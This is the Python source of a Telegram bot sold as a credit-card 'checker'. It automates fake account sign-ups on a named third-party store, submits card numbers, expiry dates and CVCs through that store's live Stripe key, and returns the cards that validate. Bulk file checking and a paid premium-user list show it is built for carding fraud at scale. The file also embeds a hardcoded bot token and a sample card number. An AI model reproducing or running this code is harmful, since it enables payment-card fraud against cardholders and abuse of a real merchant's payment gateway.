import telebot
import requests
import random
import string
import time
import re
import os

BOT_TOKEN = '7973668642:AAEUQDV5J3UFJ067FyScyVWZxACBw4Fv7gw'
bot = telebot.TeleBot(BOT_TOKEN)

OWNER_IDS = [7513578929, 7513578929]  # IDs of the owners
PREMIUM_FILE = "premium.txt"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_email():
    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
    name_length = 8
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    domain = random.choice(domains)
    return f"{name}@{domain}"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

# Check if user is premium
def is_premium_user(user_id):
    if os.path.exists(PREMIUM_FILE):
        with open(PREMIUM_FILE, "r") as file:
            premium_users = file.read().splitlines()
        return str(user_id) in premium_users
    return False

def process_single_cc(cc):
    try:
        session = requests.Session()
        headers = {'user-agent': generate_user_agent()}
        response = session.get('https://caretuition.co.uk/my-account/', headers=headers)
        nonce = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', response.text).group(1)
        acc = generate_email()
        data = {
            'email': acc,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        session.post('https://caretuition.co.uk/my-account/', headers=headers, data=data)
        response = session.get('https://caretuition.co.uk/my-orders/add-payment-method/', headers=headers)
        noncec = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', response.text).group(1)
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': generate_user_agent(),
            'referer': 'https://js.stripe.com/',
        }
        stripe_data = f'type=card&billing_details[name]=+&billing_details[email]={acc}&card[number]={cc.split("|")[0]}&card[cvc]={cc.split("|")[3]}&card[exp_month]={cc.split("|")[1]}&card[exp_year]={cc.split("|")[2]}&key=pk_live_51KbjCnJuu9Qhmk4PaXnL2pfLANOtnAVlLiq9b4rCK0Gf79YsczSWMv3FdgOGxAMt6MyUm7fR9KSVUqY5jr24jBP100mDQDh2KQ'
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        stripe_json = stripe_response.json()
        stripe_id = stripe_json.get('id', None)
        if stripe_id:
            data = {
                'stripe_source_id': stripe_id,
                'nonce': noncec,
            }
            final_response = session.post(
                'https://caretuition.co.uk/', 
                params={'wc-ajax': 'wc_stripe_create_setup_intent'}, 
                headers=headers, 
                data=data
            )
            response_json = final_response.json()
            if response_json.get('status') == 'success':
                return (
                    f"🌟 **APPROVED ✅**\n"
                    f"💳 **CARD:** {cc}\n"
                    f"📋 **Status:** APPROVED\n"
                    f"🔑 **Gateway:** STRIPE AUTH\n"
                    f"📜 **Raw Response:** {response_json}\n"
                    f"👨‍💻 **Developed by:** @Titan_kumar"
                )
        return (
            f"❌ **DECLINED ❌**\n"
            f"💳 **CARD:** {cc}\n"
            f"📋 **Status:** DECLINED\n"
            f"🔑 **Gateway:** STRIPE AUTH\n"
            f"📜 **Raw Response:** {stripe_json}\n"
            f"👨‍💻 **Developed by:** @Titan_kumar"
        )
    except Exception as e:
        return (
            f"❌ **DECLINED ❌**\n"
            f"💳 **CARD:** {cc}\n"
            f"📋 **Status:** DECLINED\n"
            f"📋 **Error:** {str(e)}\n"
            f"👨‍💻 **Developed by:** @Titan_kumar"
        )

# /start command
@bot.message_handler(commands=['start'])
def start(message):
    if not is_premium_user(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "❌ You need to buy access to use this bot. Contact @dpsecr for access. Developers: @dpsecr, @Baign_Baign"
        )
        return

    msg = bot.send_message(message.chat.id, "Bot is booting up 🚀 [□□□□□□□□□□]")
    for i in range(10):
        bot.edit_message_text(f"Bot is booting up 🚀 [{('■' * (i + 1)).ljust(10, '□')}]", message.chat.id, msg.id)
        time.sleep(0.2)
    bot.edit_message_text(
        "🚀 Welcome to the Future CC Checker Bot!\nUse /help to see available commands. 🌟", 
        msg.chat.id, 
        msg.id
    )

# /help command
@bot.message_handler(commands=['help'])
def help_command(message):
    if not is_premium_user(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "❌ You need to buy access to use this bot. Contact @dpsecr for access. Developers: @dpsecr, @Baign_Baign"
        )
        return
    bot.send_message(message.chat.id, "🛠️ **Available Commands:**\n\n/chk [card] - Check a single CC 💳\n/mchk - Check multiple CCs via file 📄")

# /chk command (Check single card)
@bot.message_handler(commands=['chk'])
def check_cc(message):
    if not is_premium_user(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "❌ You need to buy access to use this bot. Contact @dpsecr for access. Developers: @dpsecr, @Baign_Baign"
        )
        return
    try:
        cc = message.text.split()[1]
        msg = bot.send_message(message.chat.id, "Processing your CC 💳")
        result = process_single_cc(cc)
        bot.send_message(message.chat.id, result)
    except IndexError:
        bot.send_message(message.chat.id, "❌ Invalid format. Use: `/chk 4934740000721153|10|2027|817`")

# /mchk command (Check multiple cards)
@bot.message_handler(commands=['mchk'])
def multi_check_cc(message):
    if not is_premium_user(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "❌ You need to buy access to use this bot. Contact @dpsecr for access. Developers: @dpsecr, @Baign_Baign"
        )
        return
    bot.send_message(message.chat.id, "📄 Send the text file containing CCs now.")

# Handle file upload
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not is_premium_user(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "❌ You need to buy access to use this bot. Contact @dpsecr for access. Developers: @dpsecr, @Baign_Baign"
        )
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cc_list = downloaded_file.decode('utf-8').strip().splitlines()
        bot.send_message(message.chat.id, "Processing your CCs ✅")

        approved = []
        for cc in cc_list:
            result = process_single_cc(cc)
            if "APPROVED ✅" in result:
                approved.append(cc)
                bot.send_message(message.chat.id, result)

        response = f"✅ **Approved Cards:** {len(approved)}\n"
        bot.send_message(message.chat.id, response)

        if approved:
            approved_file = "\n".join(approved)
            with open("approved_cards.txt", "w") as f:
                f.write(approved_file)
            with open("approved_cards.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error processing file: {str(e)}")

# /add command to add new premium user
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id not in OWNER_IDS:
        bot.send_message(message.chat.id, "❌ You are not authorized to use this command.")
        return

    try:
        new_user_username = message.text.split()[1]
        with open(PREMIUM_FILE, "a") as file:
            file.write(f"{new_user_username}\n")
        bot.send_message(message.chat.id, f"✅ User {new_user_username} added to premium list.")
    except IndexError:
        bot.send_message(message.chat.id, "❌ Invalid format. Use: `/add username`.")

# Start polling
bot.polling()